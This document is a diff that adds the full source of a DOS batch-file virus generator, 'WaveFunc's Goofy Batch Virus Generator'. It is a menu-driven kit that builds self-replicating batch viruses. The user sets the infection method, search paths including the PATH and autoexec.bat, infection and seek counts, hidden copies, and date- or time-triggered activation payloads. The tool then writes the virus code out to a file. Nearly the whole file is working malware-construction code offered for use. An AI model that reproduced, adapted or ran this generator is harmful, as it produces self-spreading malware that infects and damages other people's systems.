@@ -1,0 +1,562 @@
+::
+:: Batch Virus Generator by WaveFunc  Version 1.1C
+:: Creates User-Defined Reproducing Batch Files
+:: Requires DOS 6! also SETINVAR.COM and CONVBAT.EXE
+::
+:: This batch contains ANSI codes and a few lines that
+:: end in spaces (you can't see them but they are vital!)
+:: ZIP Then UUE before sending through any email system.
+::
+@echo off
+if '%1=='BvG goto %2
+command /e:5000 /c %0 BvG shell
+if exist temp$.bat del temp$.bat
+goto end
+:shell
+:: set these to your favorite programs...
+set listprg=SHOW
+set editprg=EDIT
+:: Yes to use ANSI (if available), No to ignore
+set useansi=Yes
+:: check memory for ANSI...
+:: (it works now...)
+if not %useansi%==Yes goto noacheck
+mem /c|find "ANSI">nul
+if errorlevel 1 set useansi=No
+:noacheck
+:: Yes if ANSI art has multiparts, No if not...
+set multians=Yes
+:: Keystrings in the parts
+set part1=ApPe
+set part2=InSe
+set part3=CoM1
+set part4=CoM2
+:: idiot check
+echo.|setinvar temp$.bat>nul
+if not exist temp$.bat echo No SETINVAR.COM file!
+if not exist temp$.bat goto end
+:: defaults NOTE! crashes if data is even slightly incorrect! 
+:: type.. 1-appending, 2-prepending,
+:: 3-compound vir 1st, 4-compound host 1st
+set type=3
+:: default search method (search variable set by menu section)
+set srch=111
+:: findhost.. if Yes finds host along path
+set findhost=Yes
+:: makecopy.. if Yes uses a hidden file
+set makecopy=No
+:: limits - specify by number of 1's
+set seeks=11111111
+set infect=11
+:: activations...
+set actfile=
+set time1=
+set time2=
+set date1=
+set date2=
+:: name for cfg and batvir files...
+set virname=virus
+:: key string for the virus...
+set key=ViRuS
+:: variables for interface
+set space=
+set space1=
+:: 12 spaces...
+if %useansi%==Yes set space=            
+:: 24 spaces...
+if %useansi%==Yes set space1=                        
+:: must be 1 more than max search patterns
+set maxsrch=11111111
+:: max counts (1 over)
+set maxseeks=1111111111111111111111111
+set maxinfect=111111111
+
+:loadcfg
+if not exist %virname%.cfg goto menuclr
+copy %virname%.cfg temp$.bat>nul
+call temp$.bat
+
+:menuclr
+if not %useansi%==Yes goto menu
+if not exist bvgen.ans goto menuc1
+if not %multians%==Yes goto menuc2
+::set anskey=%%part%type%%%
+if %type%==1 set anskey=%part1%
+if %type%==2 set anskey=%part2%
+if %type%==3 set anskey=%part3%
+if %type%==4 set anskey=%part4%
+find "%anskey%"<bvgen.ans
+goto menu
+:menuc2
+type bvgen.ans
+goto menu
+:menuc1
+echo [1;37;44m
+cls
+
+:menu
+if exist temp$.bat del temp$.bat
+:: take power of search away from user - limit choices
+if '%srch%==' set search=. .. %%path%%
+if '%srch%=='1 set search=.. . %%path%%
+if '%srch%=='11 set search=. %%path%%
+if '%srch%=='111 set search=*.bat
+if '%srch%=='1111 set search=*.bat ..\*.bat
+if '%srch%=='11111 set search=..\*.bat *.bat
+if '%srch%=='111111 set search=*.bat ..\*.bat c:*.bat
+if '%srch%=='1111111 set search=..\*.bat c:*.bat *.bat
+::if '%search%==' set search=. .. %%path%%
+
+if %type%==1 if %makecopy%==No set makecopy=Yes
+if %type%==1 if %findhost%==Yes set findhost=No
+if '%key%==' set key=ViRuS
+if '%virname%==' set virname=virus
+
+if %useansi%==Yes echo [1;37;44m[H
+if not %useansi%==Yes cls
+if not %useansi%==Yes echo.
+echo  WaveFunc's Goofy Batch Virus Generator
+echo  ======================================
+if %type%==1 echo  A  Virus Type:      appending
+if %type%==2 echo  A  Virus Type:      inserting
+if %type%==3 echo  A  Virus Type:      compound (virus-host)
+if %type%==4 echo  A  Virus Type:      compound (host-virus)
+echo  B  Name for files:  %virname%
+echo  C  Key string:      %key%
+echo  D  Infects per run: %infect%
+echo  E  Seeks per run:   %seeks%
+echo  F  Search Elements: %search%%space%
+echo  G  Find Host?       %findhost%%space%
+echo  H  Use Hidden Copy? %makecopy%%space%
+echo  I  Date Conditions: %date1% %date2%
+echo  J  Time Conditions: %time1% %time2%
+echo  K  Activation File: %actfile%
+echo.
+echo  M  Make Batch Virus
+echo  N  Save Config File
+echo  O  Program notes
+echo  P  List this batch
+echo  Q  Quit
+:getmench
+choice /c:abcdefghijklmnopqyz>nul
+if errorlevel 5 if not errorlevel 6 goto getseeks
+if errorlevel 4 if not errorlevel 5 goto getinfect
+if errorlevel 19 goto specialz
+if errorlevel 18 goto specialy
+if errorlevel 17 goto getout
+if errorlevel 16 goto listthis
+if errorlevel 15 goto notes
+if errorlevel 14 goto savecfg
+if errorlevel 13 goto makebat
+if errorlevel 12 goto menu
+if errorlevel 11 goto a_entry
+if errorlevel 10 goto timecnd
+if errorlevel 9 goto datecnd
+if errorlevel 8 goto togcopy
+if errorlevel 7 goto toghost
+if errorlevel 6 goto togsearch
+if errorlevel 3 goto getkey
+if errorlevel 2 goto getname
+if errorlevel 1 goto togtype
+echo Sorry. Dos 6 required!
+goto end
+:getout
+if %useansi%==Yes echo [0m
+cls
+echo.
+goto end
+:togtype
+if %type%==4 set type=x
+if %type%==3 set type=4
+if %type%==2 set type=3
+if %type%==1 set type=2
+if %type%==x set type=1
+goto menuclr
+:getname
+echo.
+echo Enter name for files (no extension)...
+setinvar temp$.bat
+call temp$
+set virname=%in%
+goto loadcfg
+:getkey
+echo.
+echo Enter key string (no more than 7 chars, must be unique)...
+setinvar temp$.bat
+echo.
+call temp$
+set key=%in%
+goto menuclr
+:getinfect
+set infect=%infect%1
+if %infect%==%maxinfect% set infect=
+set var1=%infect%
+if '%var1%==' set var1=%space1%
+if %useansi%==Yes echo [s[7;22H%var1%[u[1A
+if %useansi%==Yes goto getmench
+goto menu
+:getseeks
+set seeks=%seeks%1
+if %seeks%==%maxseeks% set seeks=
+set var1=%seeks%
+if '%var1%==' set var1=%space1%
+if %useansi%==Yes echo [s[8;22H%var1%[u[1A
+if %useansi%==Yes goto getmench
+goto menu
+:togsearch
+set srch=%srch%1
+if %srch%==%maxsrch% set srch=
+goto menu
+
+:toghost
+if %findhost%==Yes set findhost=x
+if %findhost%==No set findhost=Yes
+if %findhost%==x set findhost=No
+goto menu
+:togcopy
+if %makecopy%==Yes set makecopy=x
+if %makecopy%==No set makecopy=Yes
+if %makecopy%==x set makecopy=No
+goto menu
+:datecnd
+echo.
+echo Enter first date string...
+setinvar temp$.bat
+call temp$
+set date1=%in%
+if '%date1%==' set date2=
+if '%date1%==' goto menuclr
+echo.
+echo Enter second date string...
+setinvar temp$.bat
+call temp$
+set date2=%in%
+goto menuclr
+:timecnd
+echo.
+echo Enter first time string...
+setinvar temp$.bat
+call temp$
+set time1=%in%
+if '%time1%==' set time2=
+if '%time1%==' goto menuclr
+echo.
+echo Enter second time string...
+setinvar temp$.bat
+call temp$
+set time2=%in%
+goto menuclr
+:actdire
+if exist temp$.bat del temp$.bat
+dir /p
+:actfile
+echo.
+echo Enter activation batch filename... (?-dir, m-menu, q-quit)
+setinvar temp$.bat
+echo.
+call temp$
+if '%in%=='? goto actdire
+if '%in%=='m goto actmenu
+if '%in%=='q goto menuclr
+set actfile=%in%
+if '%actfile%==' goto menuclr
+:a_entry
+:: add this line after the label :a_entry... (bug)
+if '%actfile%==' goto actfile
+if exist %actfile% goto actmenu
+echo file does not exist - create with %editprg%? (Y/N/Another)
+choice /c:yna>nul
+if errorlevel 3 goto actfile
+if errorlevel 2 goto menuclr
+:a_edit
+cls
+call %editprg% %actfile%
+if not exist %actfile% goto menuclr
+:actmenu
+if '%actfile%==' goto menuclr
+if not %useansi%==Yes cls
+if not %useansi%==Yes goto am1
+if not exist bvgen.ans goto menua1
+if not %multians%==Yes goto menua2
+find "%anskey%"<bvgen.ans
+goto am1
+:menua2
+type bvgen.ans
+goto am1
+:menua1
+echo [1;37;44m
+cls
+:am1
+if %useansi%==Yes echo [1;37;44m[H
+echo.
+echo.
+echo  Select...
+echo.
+echo  1 - View %actfile%
+echo  2 - Edit %actfile%
+echo  3 - Run %actfile% code
+echo  4 - Specify another file
+echo  5 - Back to main menu
+echo.
+choice /c:12345>nul
+if errorlevel 5 goto menuclr
+if errorlevel 4 goto actfile
+if errorlevel 3 goto a_run
+if errorlevel 2 goto a_edit
+call %listprg% %actfile%
+goto actmenu
+:a_run
+echo Confirm - run this activation code?
+choice /c:yn>nul
+if errorlevel 2 goto actmenu
+set outfile=test$.bat
+set return=testact1
+goto convafil
+:testact1
+if %useansi%==Yes echo [0m[2J[1B
+call test$.bat
+del test$.bat
+echo -- press any key to continue --
+pause>nul
+goto actmenu
+
+:savecfg
+echo.
+echo Saving config file...
+> %virname%.cfg echo set key=%key%
+>>%virname%.cfg echo set actfile=%actfile%
+>>%virname%.cfg echo set time1=%time1%
+>>%virname%.cfg echo set time2=%time2%
+>>%virname%.cfg echo set date1=%date1%
+>>%virname%.cfg echo set date2=%date2%
+>>%virname%.cfg echo set findhost=%findhost%
+>>%virname%.cfg echo set makecopy=%makecopy%
+>>%virname%.cfg echo set seeks=%seeks%
+>>%virname%.cfg echo set infect=%infect%
+>>%virname%.cfg echo set type=%type%
+>>%virname%.cfg echo set srch=%srch%
+>>%virname%.cfg echo set useansi=%useansi%
+>>%virname%.cfg echo set multians=%multians%
+goto menuclr
+
+:makebat
+cls
+echo.
+echo Making batch virus code...
+echo.
+
+set v=%virname%.ba
+if exist %v% del %v%
+
+set v1=%%%key%%%
+if %makecopy%==Yes set v1=c:\_%key%
+set v8=end
+if %type%==2 set v8=xt
+
+if not %type%==3 if not %type%==4 goto mk1
+>>%v% echo @if '%%_%virname%%%==' goto _%virname%
+>>%v% echo ::**** HOST ****
+>>%v% echo @if not '%%_%virname%%%==' goto %key%end
+>>%v% echo :_%virname% %key%
+:mk1
+if %type%==1 >>%v% echo ::**** HOST ****
+>>%v% echo @echo off%%_%key%%%
+>>%v% echo if '%%1=='%key% goto %key%%%2
+>>%v% echo set %key%=%%0.bat
+>>%v% echo if not exist %%%key%%% set %key%=%%0
+>>%v% echo if '%%%key%%%==' set %key%=autoexec.bat
+if not %type%==3 if not %type%==4 goto mk1a
+>>%v% echo set !%key%=%%1 %%2 %%3 %%4 %%5 %%6 %%7 %%8 %%9
+:mk1a
+if not %type%==4 goto mk2
+>>%v% echo call %%%key%%% %key% rh
+>>%v% echo set _%virname%=}nul.%key%
+>>%v% echo set !%key%=
+:mk2
+if %makecopy%==Yes >>%v% echo if exist c:\_%key%.bat goto %key%g
+if %findhost%==No goto mk2b
+>>%v% echo if exist %%%key%%% goto %key%fe
+>>%v% echo call %%%key%%% %key% h %%path%%
+>>%v% echo if exist %%%key%%% goto %key%fe
+>>%v% echo goto e%key%
+>>%v% echo :%key%h
+>>%v% echo shift%%_%key%%%
+>>%v% echo if '%%2==' goto %key%%v8%
+>>%v% echo if exist %%2\%%%key%%% set %key%=%%2\%%%key%%%
+>>%v% echo if exist %%2%%%key%%% set %key%=%%2%%%key%%%
+>>%v% echo if exist %%2\%%%key%%%.bat set %key%=%%2\%%%key%%%.bat
+>>%v% echo if exist %%2%%%key%%%.bat set %key%=%%2%%%key%%%.bat
+>>%v% echo if not exist %%%key%%% goto %key%h
+>>%v% echo goto %key%%v8%
+>>%v% echo :%key%fe
+:mk2b
+if %makecopy%==No goto mk2a
+if %findhost%==No >>%v% echo if not exist %%%key%%% goto e%key%
+>>%v% echo find "%key%"{%%%key%%%}c:\_%key%.bat
+>>%v% echo attrib c:\_%key%.bat +h
+>>%v% echo :%key%g
+:mk2a
+if %makecopy%==No if %findhost%==No >>%v% echo if not exist %%%key%%% goto e%key%
+set v3=/e:5000 /c
+if '%seeks%'%infect%'==''' set v3=/c
+if '%seeks%'%infect%'==''1' set v3=/c
+echo %search%|find /i "*">nul
+if errorlevel 1 >>%v% echo command %v3% %v1% %key% vir %search%
+if not errorlevel 1 >>%v% echo command %v3% %v1% %key% vir
+>>%v% echo :e%key%
+if '%time1%==' if '%date1%==' goto mka5 
+if '%date1%==' goto mka3
+>>%v% echo echo.^date^find "%date1%"}nul.%key%
+>>%v% echo if errorlevel 1 goto na%key%
+:mka3
+if '%date2%==' goto mka4
+>>%v% echo echo.^date^find "%date2%"}nul.%key%
+>>%v% echo if errorlevel 1 goto na%key%
+:mka4
+if '%time1%==' goto mka1
+>>%v% echo echo.^time^find "%time1%"}nul.%key%
+>>%v% echo if errorlevel 1 goto na%key%
+:mka1
+if '%time2%==' goto mka2
+>>%v% echo echo.^time^find "%time2%"}nul.%key%
+>>%v% echo if errorlevel 1 goto na%key%
+:mka2
+if '%actfile%==' >>%v% echo :: %key% *** put activation code here ***
+:mka5
+if '%actfile%==' goto mka7
+if not exist %actfile% goto mka7
+set outfile=outfile.act
+set return=mkadone
+:: convert actfile so it'll replicate!
+:convafil
+echo Converting activation file...
+echo.
+>>temp$.bas echo on error goto getout
+>>temp$.bas echo open "%actfile%" for input as #1
+>>temp$.bas echo open "%outfile%" for output as #2
+>>temp$.bas echo p0:line input #1,a$:if left$(a$,1)=":" then goto p1
+>>temp$.bas echo b$=lcase$(a$):if instr(b$,"goto ") then goto p1
+>>temp$.bas echo print #2,a$;"%%_%key%%%":goto p0
+>>temp$.bas echo p1:print #2,a$;" %key%":goto p0
+>>temp$.bas echo getout:close #1:close #2:system
+qbasic /run temp$.bas
+del temp$.bas
+goto %return%
+:mkadone
+>>%v% type outfile.act 
+del outfile.act
+:mka7
+if '%time1%==' if '%date1%==' goto mka7a 
+>>%v% echo :na%key%
+:mka7a
+if not %type%==3 goto mk3
+>>%v% echo call %%%key%%% %key% rh
+>>%v% echo set _%virname%=}nul.%key%
+>>%v% echo set !%key%=
+:mk3
+>>%v% echo set %key%=
+if %findhost%%makecopy%==NoYes goto mk3j
+if %type%==2 >>%v% echo if exist !!%key%.bat del !!%key%.bat
+:mk3j
+>>%v% echo goto %key%end
+if %findhost%%makecopy%==NoYes goto mk3n
+if %type%==2 >>%v% echo :%key%xt
+if %type%==2 >>%v% echo echo.}!!%key%.bat
+if %type%==2 >>%v% echo !!%key%.bat
+:mk3n
+if not %type%==3 if not %type%==4 goto mk4
+>>%v% echo :%key%rh
+>>%v% echo set _%virname%=x%%_%key%%%
+>>%v% echo %%%key%%% %%!%key%%%
+:mk4
+>>%v% echo :%key%vir
+echo %search%|find /i "*">nul
+if errorlevel 1 goto mk4a1
+>>%v% echo for %%%%a in (%search%) do call %v1% %key% i %%%%a
+>>%v% echo exit %key%
+goto mk4a2
+:mk4a1
+>>%v% echo shift%%_%key%%%
+>>%v% echo if '%%2==' exit %key%
+>>%v% echo for %%%%a in (%%2\*.bat %%2*.bat) do call %v1% %key% i %%%%a
+>>%v% echo goto %key%vir
+:mk4a2
+>>%v% echo :%key%i
+>>%v% echo find "%key%"{%%3}nul
+if '%seeks%==' set v2=%key%end
+if %type%==2 if %makecopy%==No set v2=%key%xt
+if not '%seeks%==' set v2=%key%j
+>>%v% echo if not errorlevel 1 goto %v2%
+set v2=type c:\_%key%.bat
+if %makecopy%==No set v2=find "%key%"{%%%key%%%
+if %type%==1 >>%v% echo type %%3}%key%$
+if %type%==1 >>%v% echo echo.}}%key%$
+if %type%==1 >>%v% echo %v2%}}%key%$
+if %type%==2 >>%v% echo %v2%}%key%$
+if %type%==2 >>%v% echo type %%3}}%key%$
+if not %type%==3 if not %type%==4 goto mk6
+>>%v% echo echo @if '%%%%_%virname%%%%%==' goto _%virname%}%key%$
+>>%v% echo type %%3}}%key%$
+>>%v% echo echo.}}%key%$
+>>%v% echo %v2%}}%key%$
+:mk6
+>>%v% echo move %key%$ %%3}nul
+if '%infect%==' goto mk6b
+if '%infect%=='1 >>%v% echo exit %key%
+if '%infect%=='1 goto mk6b
+>>%v% echo set %key%#=%%%key%#%%1
+>>%v% echo if %%%key%#%%==%infect% exit
+:mk6b
+if '%seeks%==' goto mk7
+>>%v% echo :%key%j
+>>%v% echo set %key%!=%%%key%!%%1
+>>%v% echo if %%%key%!%%==%seeks% exit
+:mk7
+if '%infect%'%seeks%=='1' goto mk7a
+if %type%==2 if %makecopy%==No >>%v% echo goto %key%xt
+:mk7a
+>>%v% echo :%key%end
+if %type%==2 >>%v% echo ::**** HOST ****
+
+:: use custom filter to convert ^{} to |<>
+echo Converting output file...
+type %v%|convbat.exe>outfile.dat
+::(remove nul for list60)
+type outfile.dat>%v%
+del outfile.dat
+
+:: view output with list program
+call %listprg% %v%
+goto menuclr
+
+:listthis
+set this=%0.bat
+if not exist %this% set this=%0
+if exist %this% %listprg% %this%
+goto menuclr
+:notes
+if exist bvgen.txt %listprg% bvgen.txt
+goto menuclr
+
+:specialy
+echo.
+choice /c:yn /t:n,02 Change UseAnsi setting?
+if errorlevel 2 goto menuclr
+if %useansi%==Yes set useansi=x
+if %useansi%==No set useansi=Yes
+if %useansi%==x set useansi=No
+if %useansi%==No echo [0m
+goto menuclr 
+:specialz
+echo.
+choice /c:yn /t:n,02 Change MultiAns setting?
+if errorlevel 2 goto menuclr
+if %multians%==Yes set multians=x
+if %multians%==No set multians=Yes
+if %multians%==x set multians=No
+goto menuclr 
+
+
+:end
+::*********** END ************
+
